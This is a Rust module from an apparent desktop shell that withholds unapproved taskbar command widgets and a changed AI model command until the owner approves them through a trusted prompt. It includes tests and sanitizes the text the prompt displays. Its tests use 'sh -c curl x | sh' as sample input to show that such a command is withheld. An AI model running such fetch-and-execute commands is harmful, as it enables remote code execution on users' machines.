// SPDX-License-Identifier: AGPL-3.0-only
//! Withholding unapproved command widgets (ADR 0067 "Withhold"; COMP-10
//! §3.11).
//!
//! Every road to a new command ends in `config::apply_loaded`: an inotify
//! reload and a `set_config_collection` commit alike. There, [`settle`] keeps
//! a command widget in the live config only if its canonical hash equals the
//! catalog block of the same name, the owner's recorded approval, or an
//! approval given this session (`widget_approvals.granted`). Anything
//! else is withheld: removed from `bar.custom_widgets` (so `get_config` never
//! serves its argv and the taskbar never runs it), remembered in
//! `state.widget_approvals.withheld`, and queued once in
//! `state.widget_approvals.queue` for the compositor-drawn prompt. Its
//! `custom:<name>` id stays in `bar.widgets.*` and draws nothing.
//!
//! This module decides and queues; it draws nothing and answers nothing. The
//! prompt (Trusted UI, TCB) pulls from [`next_pending`], and on the owner's
//! answer inserts into `widget_approvals.granted` and calls
//! `approvals::persist`, or calls `config_rpc::revert_widget` or
//! `config_rpc::remove_widget`, or inserts into `widget_approvals.declined` for
//! Not now.
//!
//! The Oracle Eyes model command (`oracle-eyes.model-command`, owner decision
//! 3) takes the same path: anything but the shipped default or the owner's
//! approval is withheld from the live config and queued once, in
//! `widget_approvals.model_command`. See [`ModelCommandApproval`].

use std::collections::{HashSet, VecDeque};

use super::widget_hash::{self, WidgetHash};
use super::{approvals, Config, CustomWidget, CustomWidgetKind};
use crate::addons::Hook;
use crate::state::AbyssState;

/// Longest command text a prompt is handed, in chars (COMP-10 §3.2 clamp).
pub const COMMAND_TEXT_MAX: usize = 512;

/// Which prompt a withheld widget gets.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PendingKind {
    /// A catalog block of this name exists and the hash differs.
    Altered,
    /// No catalog block of this name.
    New,
}

/// One withheld command widget, as the prompt needs it. Handle-free.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PendingWidget {
    pub name: String,
    pub kind: PendingKind,
    /// Display text for the untrusted block: argv and actions, control and
    /// bidi/format characters stripped, clamped to [`COMMAND_TEXT_MAX`]
    /// chars. Lines are separated by `\n`, which this module inserts and the
    /// widget can never supply.
    pub command_text: String,
    pub hash: WidgetHash,
}

impl PendingWidget {
    fn key(&self) -> (String, WidgetHash) {
        (self.name.clone(), self.hash)
    }

    fn is(&self, name: &str, hash: &WidgetHash) -> bool {
        self.name == name && self.hash == *hash
    }
}

/// The Oracle Eyes model command, withheld (owner decision 3: a changed
/// command runs only once the owner approves it, by ADR 0067's path).
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct PendingModelCommand {
    /// Display text for the untrusted block: the argv as [`command_text`]
    /// shows it, stripped and clamped the same way. One line.
    pub command_text: String,
    pub hash: WidgetHash,
}

/// Per-session state for the model command, beside the widgets'. Plain data
/// inside [`WidgetApprovals`].
///
/// This module decides and queues; the prompt (Trusted UI, TCB) pulls from
/// [`next_pending_model_command`], calls [`model_command_prompt_closed`] on
/// any answer, and on Allow inserts into `granted`, calls
/// `approvals::persist(approvals::MODEL_COMMAND_KEY, hash)` and
/// [`reapply`]; on Revert calls `config_rpc::revert_model_command`; on Not
/// now inserts into `declined`.
#[derive(Debug, Default)]
pub struct ModelCommandApproval {
    /// The command the last apply withheld; `None` when the live one is the
    /// default or approved.
    pub withheld: Option<PendingModelCommand>,
    /// `withheld` is waiting for a prompt. Never set while it is on screen
    /// or declined, so one command is never asked about twice at once.
    pub queued: bool,
    /// The hash the prompt is showing, set by [`next_pending_model_command`]
    /// and cleared by [`model_command_prompt_closed`].
    pub on_screen: Option<WidgetHash>,
    /// Not now, for this session.
    pub declined: HashSet<WidgetHash>,
    /// Approvals the owner gave this session, live at once while the store
    /// is written off the loop. **Inserted only by the Trusted UI approval
    /// surface** (`trusted_ui/`, ADR 0067).
    pub granted: HashSet<WidgetHash>,
}

/// Per-session approval state. Owned by `AbyssState`, plain data.
#[derive(Debug, Default)]
pub struct WidgetApprovals {
    /// Every command widget withheld by the last apply, with its index in the
    /// merged `widget` list, so `get_config` keeps file order.
    pub withheld: Vec<(usize, PendingWidget)>,
    /// Waiting for a prompt, oldest first. Never holds a (name, hash) twice,
    /// nor the one on screen.
    pub queue: VecDeque<PendingWidget>,
    /// The (name, hash) the prompt is showing, set by [`next_pending`] and
    /// cleared by [`prompt_closed`].
    pub on_screen: Option<(String, WidgetHash)>,
    /// Not now, for this session. The surface inserts; `review_widget`
    /// removes. A declined (name, hash) stays withheld and is not queued.
    pub declined: HashSet<(String, WidgetHash)>,
    /// Approvals the owner gave this session, live at once while
    /// `approvals::persist` writes the store off the loop (and if that write
    /// fails). Keyed by hash, so a later edit is withheld again. **Inserted
    /// only by the Trusted UI approval surface** (`trusted_ui/`, ADR 0067).
    pub granted: HashSet<(String, WidgetHash)>,
    /// The Oracle Eyes model command (owner decision 3).
    pub model_command: ModelCommandApproval,
}

/// A command widget's display text: `argv`, then one labelled line per
/// action. Arguments with spaces or quotes are single-quoted so the owner
/// sees where each one ends.
pub fn command_text(w: &CustomWidget) -> String {
    let argv = match &w.kind {
        CustomWidgetKind::Exec { argv, .. } | CustomWidgetKind::Stream { argv } => argv,
        CustomWidgetKind::Source { .. } => return String::new(),
    };
    let mut lines = vec![join(argv)];
    for (label, a) in [
        ("on-click", &w.on_click),
        ("on-scroll-up", &w.on_scroll_up),
        ("on-scroll-down", &w.on_scroll_down),
    ] {
        if let Some(a) = a {
            lines.push(format!("{label}: {}", join(a)));
        }
    }
    clamp(lines.join("\n"))
}

/// Clamp prompt text to [`COMMAND_TEXT_MAX`] chars, ending in an ellipsis
/// when cut.
fn clamp(text: String) -> String {
    if text.chars().count() <= COMMAND_TEXT_MAX {
        return text;
    }
    let mut out: String = text.chars().take(COMMAND_TEXT_MAX - 1).collect();
    out.push('\u{2026}');
    out
}

fn join(argv: &[String]) -> String {
    argv.iter()
        .map(|a| {
            let a: String = a.chars().filter(|c| !hidden(*c)).collect();
            if a.is_empty() || a.chars().any(|c| c.is_whitespace() || c == '\'' || c == '"') {
                format!("'{}'", a.replace('\'', "'\\''"))
            } else {
                a
            }
        })
        .collect::<Vec<_>>()
        .join(" ")
}

/// Characters that must not reach a trusted prompt from widget text: C0/C1
/// controls (newlines included) and the invisible format characters that can
/// reorder or hide what is drawn (bidi overrides and isolates, zero-width
/// joiners, BOM).
fn hidden(c: char) -> bool {
    c.is_control()
        || matches!(c,
            '\u{200B}'..='\u{200F}'
            | '\u{202A}'..='\u{202E}'
            | '\u{2060}'..='\u{2064}'
            | '\u{2066}'..='\u{2069}'
            | '\u{FEFF}'
            | '\u{061C}'
            | '\u{00AD}')
}

/// Same definition as a catalog block of the same name: by hash for a
/// command widget, by value for a declarative one.
pub fn is_premade(catalog: &[CustomWidget], w: &CustomWidget) -> bool {
    catalog
        .iter()
        .find(|c| c.name == w.name)
        .is_some_and(|c| match widget_hash::hash(w) {
            Some(h) => widget_hash::hash(c) == Some(h),
            None => c == w,
        })
}

/// The model command's display text: its argv, as a widget's is shown.
pub fn model_command_text(argv: &[String]) -> String {
    clamp(join(argv))
}

/// Whether `argv` is the shipped default, approved by virtue of shipping.
pub fn is_default_model_command(argv: &[String]) -> bool {
    argv.iter()
        .map(String::as_str)
        .eq(super::ORACLE_EYES_MODEL_COMMAND.iter().copied())
}

/// Decide which widgets, and which model command, in `next` go live, before
/// it becomes the live config. Called from `apply_loaded` and from
/// `addons::start`; nothing else.
pub(crate) fn settle(state: &mut AbyssState, next: &mut Config) {
    settle_model_command(state, next);
    settle_widgets(state, next);
}

/// The model command goes live only if it is the default, the owner's
/// recorded approval, or approved this session. Anything else is withheld:
/// `next.oracle_eyes.model_command` becomes `None`, so `get_config` serves
/// `null` and the daemon never sees the argv, and it is queued once for the
/// prompt. Withheld whether or not the `annotations` hook is on (fail
/// closed); queued only while it is, since without the add-on nothing would
/// run the command and nobody should be asked.
fn settle_model_command(state: &mut AbyssState, next: &mut Config) {
    let hooked = state.addons.hooks.is_on(Hook::Annotations);
    let mc = &mut state.widget_approvals.model_command;
    let Some(argv) = next.oracle_eyes.model_command.as_deref() else {
        mc.withheld = None;
        mc.queued = false;
        return;
    };
    let hash = widget_hash::model_command_hash(argv);
    // Short-circuits: the store is read only for a non-default command
    // nobody approved this session.
    if is_default_model_command(argv)
        || mc.granted.contains(&hash)
        || approvals::read().get(approvals::MODEL_COMMAND_KEY) == Some(hash)
    {
        mc.withheld = None;
        mc.queued = false;
        return;
    }
    let pending = PendingModelCommand {
        command_text: model_command_text(argv),
        hash,
    };
    next.oracle_eyes.model_command = None;
    let shown = mc.on_screen == Some(hash);
    mc.queued = hooked && !shown && !mc.declined.contains(&hash);
    if mc.queued && mc.withheld.as_ref() != Some(&pending) {
        tracing::info!("oracle-eyes model command withheld until the owner approves it");
    }
    mc.withheld = Some(pending);
}

/// The model-command prompt to show, marked on screen; `None` while it is
/// on screen, declined, or not queued. The surface calls
/// [`model_command_prompt_closed`] when the owner answers.
pub fn next_pending_model_command(state: &mut AbyssState) -> Option<PendingModelCommand> {
    let mc = &mut state.widget_approvals.model_command;
    if mc.on_screen.is_some() || !mc.queued {
        return None;
    }
    mc.queued = false;
    let p = mc.withheld.clone()?;
    if mc.declined.contains(&p.hash) {
        return None;
    }
    mc.on_screen = Some(p.hash);
    Some(p)
}

/// The model-command prompt is gone (any answer). The surface calls this.
pub fn model_command_prompt_closed(state: &mut AbyssState) {
    state.widget_approvals.model_command.on_screen = None;
}

fn settle_widgets(state: &mut AbyssState, next: &mut Config) {
    let wa = &mut state.widget_approvals;
    if !state.addons.hooks.is_on(Hook::TaskbarWidgets) {
        // ADR 0066: no hook, no catalog, no withholding, no prompt.
        super::drop_unhooked_widgets(next, state.addons.hooks);
        wa.withheld.clear();
        wa.queue.clear();
        return;
    }
    let commands = next
        .bar
        .custom_widgets
        .iter()
        .any(|w| widget_hash::hash(w).is_some());
    let approved = if commands {
        approvals::read()
    } else {
        approvals::Approvals::default()
    };
    let catalog = &next.catalog;
    let granted = &wa.granted;
    let mut withheld = Vec::new();
    let mut index = 0usize;
    next.bar.custom_widgets.retain(|w| {
        let i = index;
        index += 1;
        let Some(h) = widget_hash::hash(w) else {
            return true;
        };
        let premade = catalog.iter().find(|c| c.name == w.name);
        if premade.and_then(widget_hash::hash) == Some(h)
            || approved.get(&w.name) == Some(h)
            || granted.contains(&(w.name.clone(), h))
        {
            return true;
        }
        withheld.push((
            i,
            PendingWidget {
                name: w.name.clone(),
                kind: if premade.is_some() {
                    PendingKind::Altered
                } else {
                    PendingKind::New
                },
                command_text: command_text(w),
                hash: h,
            },
        ));
        false
    });

    // Drop queued prompts for definitions that are gone or now approved.
    wa.queue.retain(|q| {
        withheld
            .iter()
            .any(|(_, w): &(usize, PendingWidget)| w.is(&q.name, &q.hash))
    });
    for (_, w) in &withheld {
        let key = w.key();
        let shown = wa.on_screen.as_ref() == Some(&key);
        if shown || wa.declined.contains(&key) || wa.queue.iter().any(|q| q.is(&w.name, &w.hash)) {
            continue;
        }
        tracing::info!(
            name = w.name,
            kind = ?w.kind,
            "command widget withheld until the owner approves it"
        );
        wa.queue.push_back(w.clone());
    }
    wa.withheld = withheld;
}

/// The next prompt to show: the oldest queued, non-declined widget, marked on
/// screen. `None` while one is on screen (one widget per prompt) or nothing
/// is waiting. The surface calls [`prompt_closed`] when the owner answers.
pub fn next_pending(state: &mut AbyssState) -> Option<PendingWidget> {
    let wa = &mut state.widget_approvals;
    if wa.on_screen.is_some() {
        return None;
    }
    while let Some(w) = wa.queue.pop_front() {
        if wa.declined.contains(&w.key()) {
            continue;
        }
        wa.on_screen = Some(w.key());
        return Some(w);
    }
    None
}

/// The prompt is gone (any answer). The surface calls this.
pub fn prompt_closed(state: &mut AbyssState) {
    state.widget_approvals.on_screen = None;
}

/// Not now was chosen for this (name, hash) this session.
pub fn is_declined(state: &AbyssState, name: &str, hash: &WidgetHash) -> bool {
    state
        .widget_approvals
        .declined
        .contains(&(name.to_owned(), *hash))
}

/// Why `review_widget` refused.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ReviewError {
    /// No widget of that name in the config.
    Unknown,
    /// The widget is live: approved, premade, or declarative.
    NotPending,
}

/// `review_widget`: re-queue a withheld widget's prompt (ADR 0067). Clears
/// Not now for its current hash. Carries no answer. `Ok(false)` when it was
/// already queued or on screen: a peer cannot stack prompts.
pub fn review(state: &mut AbyssState, name: &str) -> Result<bool, ReviewError> {
    let wa = &mut state.widget_approvals;
    let Some((_, w)) = wa.withheld.iter().find(|(_, w)| w.name == name) else {
        return Err(
            if state.config.bar.custom_widgets.iter().any(|w| w.name == name) {
                ReviewError::NotPending
            } else {
                ReviewError::Unknown
            },
        );
    };
    let key = w.key();
    wa.declined.remove(&key);
    if wa.on_screen.as_ref() == Some(&key) || wa.queue.iter().any(|q| q.is(&w.name, &w.hash)) {
        return Ok(false);
    }
    wa.queue.push_back(w.clone());
    Ok(true)
}

/// Re-read and re-apply the config after an approval was recorded: the store
/// is not a config source, so the watcher does not see it change.
pub fn reapply(state: &mut AbyssState) {
    state.config_written.clear();
    super::watch::reload_now(state);
}

#[cfg(test)]
mod tests {
    use super::*;

    fn w(text: &str) -> CustomWidget {
        let cfg = crate::config::tests::widgets_cfg(text);
        assert!(cfg.errors.is_empty(), "{:?}", cfg.errors);
        cfg.bar.custom_widgets[0].clone()
    }

    #[test]
    fn command_text_strips_and_clamps() {
        let t = command_text(&w(
            "bar { widget \"x\" { exec \"echo\" \"a b\" \"it's\" \"\" \"z\\u{202E}\\n\\u{1b}[31mred\"; on-click \"foot\"; } }",
        ));
        assert_eq!(t, "echo 'a b' 'it'\\''s' '' z[31mred\non-click: foot");
        assert!(!t.chars().any(|c| hidden(c) && c != '\n'));

        let long = format!("bar {{ widget \"x\" {{ exec \"{}\"; }} }}", "a".repeat(2000));
        let t = command_text(&w(&long));
        assert_eq!(t.chars().count(), COMMAND_TEXT_MAX);
        assert!(t.ends_with('\u{2026}'));
    }

    #[test]
    fn a_session_grant_makes_exactly_that_hash_live() {
        let mut h = crate::shell::focus::state_tests::harness();
        h.state.addons.hooks.insert(Hook::TaskbarWidgets);
        approvals::set_test_path(None);
        let cfg = |argv: &str| {
            let c =
                crate::config::tests::widgets_cfg(&format!("bar {{ widget \"x\" {{ exec \"{argv}\"; }} }}"));
            assert!(c.errors.is_empty(), "{:?}", c.errors);
            c
        };
        let mut next = cfg("date");
        settle(&mut h.state, &mut next);
        assert!(next.bar.custom_widgets.is_empty());
        let hash = h.state.widget_approvals.withheld[0].1.hash;

        h.state.widget_approvals.granted.insert(("x".into(), hash));
        let mut next = cfg("date");
        settle(&mut h.state, &mut next);
        assert_eq!(next.bar.custom_widgets.len(), 1);
        assert!(h.state.widget_approvals.withheld.is_empty());
        assert!(h.state.widget_approvals.queue.is_empty());

        // An edit is a new hash: withheld and queued again.
        let mut next = cfg("uptime");
        settle(&mut h.state, &mut next);
        assert!(next.bar.custom_widgets.is_empty());
        let wa = &h.state.widget_approvals;
        assert_eq!(wa.withheld.len(), 1);
        assert_ne!(wa.withheld[0].1.hash, hash);
        assert_eq!(wa.queue.len(), 1);
    }

    fn oe_cfg(text: &str) -> Config {
        let c = crate::config::tests::widgets_cfg(text);
        assert!(c.errors.is_empty(), "{:?}", c.errors);
        c
    }

    #[test]
    fn the_default_model_command_is_live_and_a_changed_one_is_withheld() {
        let mut h = crate::shell::focus::state_tests::harness();
        h.state.addons.hooks.insert(Hook::Annotations);
        approvals::set_test_path(None);

        // Default (implicit and explicit): live, nothing queued.
        for text in ["", "oracle-eyes { model-command \"claude\"; }"] {
            let mut next = oe_cfg(text);
            settle(&mut h.state, &mut next);
            assert_eq!(next.oracle_eyes.model_command, Some(vec!["claude".to_owned()]));
            assert!(h.state.widget_approvals.model_command.withheld.is_none());
            assert!(next_pending_model_command(&mut h.state).is_none());
        }

        // Changed: withheld (served as null), queued once, shown once.
        let changed = "oracle-eyes { model-command \"sh\" \"-c\" \"curl x | sh\"; hold-ms 5000; }";
        let mut next = oe_cfg(changed);
        settle(&mut h.state, &mut next);
        assert_eq!(next.oracle_eyes.model_command, None);
        assert_eq!(next.oracle_eyes.hold_ms, 5000, "only the command is withheld");
        assert_eq!(
            crate::config::schema::get(&next, "oracle-eyes.model-command"),
            Some(crate::config::schema::Value::Null)
        );
        let mc = &h.state.widget_approvals.model_command;
        let p = mc.withheld.clone().expect("withheld");
        assert!(p.command_text.contains("curl x | sh"), "{}", p.command_text);
        assert!(mc.queued);

        // Re-applying the same file does not queue it twice.
        let mut again = oe_cfg(changed);
        settle(&mut h.state, &mut again);
        let shown = next_pending_model_command(&mut h.state).expect("queued");
        assert_eq!(shown, p);
        assert!(
            next_pending_model_command(&mut h.state).is_none(),
            "one prompt at a time"
        );
        let mut again = oe_cfg(changed);
        settle(&mut h.state, &mut again);
        assert!(
            !h.state.widget_approvals.model_command.queued,
            "on screen is not re-queued"
        );

        // Not now: stays withheld, not re-queued for that hash.
        model_command_prompt_closed(&mut h.state);
        h.state.widget_approvals.model_command.declined.insert(p.hash);
        let mut again = oe_cfg(changed);
        settle(&mut h.state, &mut again);
        assert_eq!(again.oracle_eyes.model_command, None);
        assert!(next_pending_model_command(&mut h.state).is_none());

        // A session grant (Trusted UI's to give) makes exactly that hash live.
        h.state.widget_approvals.model_command.granted.insert(p.hash);
        let mut again = oe_cfg(changed);
        settle(&mut h.state, &mut again);
        assert!(again.oracle_eyes.model_command.is_some());
        assert!(h.state.widget_approvals.model_command.withheld.is_none());

        // Any later edit asks again.
        let mut edited = oe_cfg("oracle-eyes { model-command \"sh\" \"-c\" \"curl y | sh\"; }");
        settle(&mut h.state, &mut edited);
        assert_eq!(edited.oracle_eyes.model_command, None);
        assert!(h.state.widget_approvals.model_command.queued);
    }

    #[test]
    fn a_recorded_approval_makes_the_model_command_live() {
        let mut h = crate::shell::focus::state_tests::harness();
        h.state.addons.hooks.insert(Hook::Annotations);
        let dir = std::env::temp_dir().join(format!("abyss-withhold-mc-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        let file = dir.join("eclipse/widget-approvals.kdl");
        approvals::set_test_path(Some(file.clone()));
        let argv = vec!["ollama".to_owned(), "run".to_owned()];
        std::fs::create_dir_all(file.parent().unwrap()).unwrap();
        std::fs::write(
            &file,
            format!(
                "approve \"{}\" \"{}\"\n",
                approvals::MODEL_COMMAND_KEY,
                widget_hash::model_command_hash(&argv).to_hex()
            ),
        )
        .unwrap();
        let mut next = oe_cfg("oracle-eyes { model-command \"ollama\" \"run\"; }");
        settle(&mut h.state, &mut next);
        assert_eq!(next.oracle_eyes.model_command, Some(argv));
        assert!(h.state.widget_approvals.model_command.withheld.is_none());
        approvals::set_test_path(None);
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn without_the_annotations_hook_a_changed_command_is_withheld_but_not_queued() {
        let mut h = crate::shell::focus::state_tests::harness();
        approvals::set_test_path(None);
        assert!(!h.state.addons.hooks.is_on(Hook::Annotations));
        let mut next = oe_cfg("oracle-eyes { model-command \"other\"; }");
        settle(&mut h.state, &mut next);
        assert_eq!(next.oracle_eyes.model_command, None);
        assert!(h.state.widget_approvals.model_command.withheld.is_some());
        assert!(next_pending_model_command(&mut h.state).is_none());
    }
}
